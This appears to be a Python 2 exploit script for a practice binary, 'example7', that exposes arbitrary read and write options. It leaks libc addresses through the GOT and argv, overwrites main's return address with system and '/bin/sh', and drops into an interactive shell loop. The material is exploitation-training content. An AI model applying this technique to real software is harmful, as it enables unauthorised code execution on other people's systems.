#!/usr/bin/python
'''
example7.py
'''

import struct
import subprocess
import os
import pty
import time

def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise

def read(fd, n):
  return os.read(fd, n)

def readuntil(fd, needle):
  res = ''
  while True:
    res += os.read(fd, 1)
    if needle in res:
      return res

def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
    proc.stdin.flush()
  except:
    raise

def write(proc, data):
  try:
    proc.stdin.write(data)
    proc.stdin.flush()
  except:
    raise

def p32(val):
  return struct.pack("<I", val)

def u32(data):
  return struct.unpack("<I", data)[0]

out_r, out_w = pty.openpty()
s = subprocess.Popen("./example7", stdin=subprocess.PIPE, stdout=out_w)

def arb_read(addr):
  readuntil(out_r, "2. Arbitrary Write")
  writeline(s, "1")
  readuntil(out_r, ": ")
  writeline(s, "%d"%addr)
  return int(readuntil(out_r, "\n"), 16) 

def arb_write(addr, val):
  readuntil(out_r, "2. Arbitrary Write")
  writeline(s, "2")
  readuntil(out_r, ": ")
  writeline(s, "%d"%addr)
  readuntil(out_r, ": ")
  writeline(s, "%d"%val)

puts_addr = arb_read(0x8049fec)

print "puts @ "+hex(puts_addr)

libc = puts_addr - 0x5fca0
libc_argv = libc + 0x1b55f0
system = libc + 0x3ada0
binsh = libc + 0x15ba0b

stack_addr = arb_read(libc_argv)

print "stack @ "+hex(stack_addr)

main_ret = stack_addr - 0x98

arb_write(main_ret, system)
arb_write(main_ret+8, binsh)

readuntil(out_r, "2. Arbitrary Write")
writeline(s, "0")
read(out_r, 102400)

print "[+] get shell"

while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  res = read(out_r, 102400)
  print res
 
